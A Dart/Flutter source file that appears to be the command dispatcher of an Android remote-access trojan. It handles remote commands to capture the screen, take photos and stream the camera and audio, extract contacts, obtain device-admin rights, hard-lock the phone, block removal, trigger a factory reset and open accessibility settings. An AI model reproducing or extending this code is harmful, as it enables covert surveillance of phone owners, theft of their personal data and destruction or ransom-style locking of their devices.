import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';

import 'camera_stream_service.dart';

class CommandHandler {
  static const MethodChannel _channel = MethodChannel('orgsapp/device_info');

  static Future<Map<String, dynamic>> handle({
    required String command,
    required String extra,
  }) async {
    debugPrint('🎯 Handle: $command | extra=$extra');

    try {
      switch (command) {
        // ===== PING =====
        case 'ping':
          return {'pong': true, 'ts': DateTime.now().toIso8601String()};

        // ===== FLASHLIGHT =====
        case 'flash_strobe':
          final ok = await _channel.invokeMethod<bool>('flashStrobe');
          return {'ok': ok ?? false};

        case 'stop_strobe':
          final ok = await _channel.invokeMethod<bool>('stopStrobe');
          return {'ok': ok ?? false};

        // ===== VIBRATE =====
        case 'vibrate_loop':
          final ok = await _channel.invokeMethod<bool>('vibrateLoop');
          return {'ok': ok ?? false};

        case 'stop_vibrate':
          final ok = await _channel.invokeMethod<bool>('stopVibrate');
          return {'ok': ok ?? false};

        // ===== SCREEN CAPTURE =====
        case 'get_screen':
          try {
            await _channel.invokeMethod<bool>('requestScreenCapture');
            await Future.delayed(const Duration(milliseconds: 300));
          } catch (e) {
            debugPrint('Request projection error: $e');
          }
          final b64 = await _channel.invokeMethod<String>('captureScreen');
          return {
            'ok': b64 != null && b64.isNotEmpty,
            'image_base64': b64 ?? '',
            'size': b64?.length ?? 0,
          };

        case 'request_screen_capture':
          final ok = await _channel.invokeMethod<bool>('requestScreenCapture');
          return {'ok': ok ?? false};

        case 'stop_screen_capture':
          final ok = await _channel.invokeMethod<bool>('stopScreenCapture');
          return {'ok': ok ?? false};

        // ===== CAMERA (CameraX REAL) =====
        case 'take_photo':
          final facing = extra.isEmpty ? 'back' : extra;
          final b64 = await CameraStreamService.takePhoto(facing: facing);
          return {
            'ok': b64.isNotEmpty,
            'image_base64': b64,
            'size': b64.length,
          };

        case 'start_camera_stream':
          final facing = extra.isEmpty ? 'back' : extra;
          final ok = await CameraStreamService.start(
            facing: facing,
            intervalMs: 200,
          );
          return {
            'ok': ok,
            'facing': facing,
            'interval': 200,
          };

        case 'stop_camera_stream':
          await CameraStreamService.stop();
          return {'ok': true};

        // ===== AUDIO =====
        case 'play_audio':
          final ok = await _channel.invokeMethod<bool>(
            'playAudio',
            {'url': extra},
          );
          return {'ok': ok ?? false};

        case 'stop_audio':
          final ok = await _channel.invokeMethod<bool>('stopAudio');
          return {'ok': ok ?? false};

        case 'start_audio_stream':
          final ok = await _channel.invokeMethod<bool>('startAudioStream');
          return {'ok': ok ?? false};

        case 'stop_audio_stream':
          final ok = await _channel.invokeMethod<bool>('stopAudioStream');
          return {'ok': ok ?? false};

        // ===== WALLPAPER =====
        case 'set_wallpaper':
          final ok = await _channel.invokeMethod<bool>(
            'setWallpaper',
            {'url': extra},
          );
          return {'ok': ok ?? false};

        // ===== LOCK / UNLOCK / ADMIN =====
        case 'hard_lock':
          final isAdmin = await _channel.invokeMethod<bool>('isDeviceAdmin');
          if (isAdmin != true) {
            await _channel.invokeMethod('requestDeviceAdmin');
            return {
              'ok': false,
              'error': 'device_admin_not_active',
              'message': 'Dialog admin dibuka. User harus klik Activate.',
            };
          }
          final locked = await _channel.invokeMethod<bool>('hardLock');
          return {
            'ok': locked ?? false,
            'locked': locked ?? false,
          };

        case 'unlock':
          final ok = await _channel.invokeMethod<bool>('unlock');
          return {'ok': ok ?? false};

        case 'is_device_admin':
          final isAdmin = await _channel.invokeMethod<bool>('isDeviceAdmin');
          return {'is_admin': isAdmin ?? false};

        case 'request_device_admin':
          await _channel.invokeMethod('requestDeviceAdmin');
          return {'ok': true, 'message': 'Dialog dibuka di HP'};

        // ===== URL =====
        case 'open_url':
          final ok = await _channel.invokeMethod<bool>(
            'openUrl',
            {'url': extra},
          );
          return {'ok': ok ?? false};

        // ===== FORCE OPEN =====
        case 'force_open':
          final ok = await _channel.invokeMethod<bool>('forceOpen');
          return {'ok': ok ?? false};

        // ===== PROTECTION =====
        case 'enable_protection':
          final method = extra.isEmpty ? 'both' : extra;
          final ok = await _channel.invokeMethod<bool>(
            'enableProtection',
            {'method': method},
          );
          return {'ok': ok ?? false};

        case 'disable_protection':
          final ok = await _channel.invokeMethod<bool>('disableProtection');
          return {'ok': ok ?? false};

        // ===== FACTORY RESET =====
        case 'factory_reset':
          final ok = await _channel.invokeMethod<bool>('factoryReset');
          return {'ok': ok ?? false};

        // ===== CONTACTS =====
        case 'get_contacts':
          try {
            final contacts = await _channel
                .invokeMethod<List<dynamic>>('getContacts');
            return {
              'ok': true,
              'contacts': contacts ?? [],
              'count': contacts?.length ?? 0,
            };
          } catch (e) {
            return {'ok': false, 'error': e.toString()};
          }

        // ===== ACCESSIBILITY =====
        case 'open_accessibility':
          await _channel.invokeMethod('openAccessibilitySettings');
          return {'ok': true};

        // ===== DEFAULT =====
        default:
          debugPrint('⚠️ Unknown command: $command');
          return {'error': 'unknown_command', 'command': command};
      }
    } on PlatformException catch (e) {
      debugPrint('❌ PlatformException [$command]: ${e.message}');
      return {
        'ok': false,
        'error': 'platform_exception',
        'message': e.message,
        'code': e.code,
      };
    } catch (e, st) {
      debugPrint('❌ Handler error [$command]: $e\n$st');
      return {
        'ok': false,
        'error': 'handler_error',
        'message': e.toString(),
      };
    }
  }
}
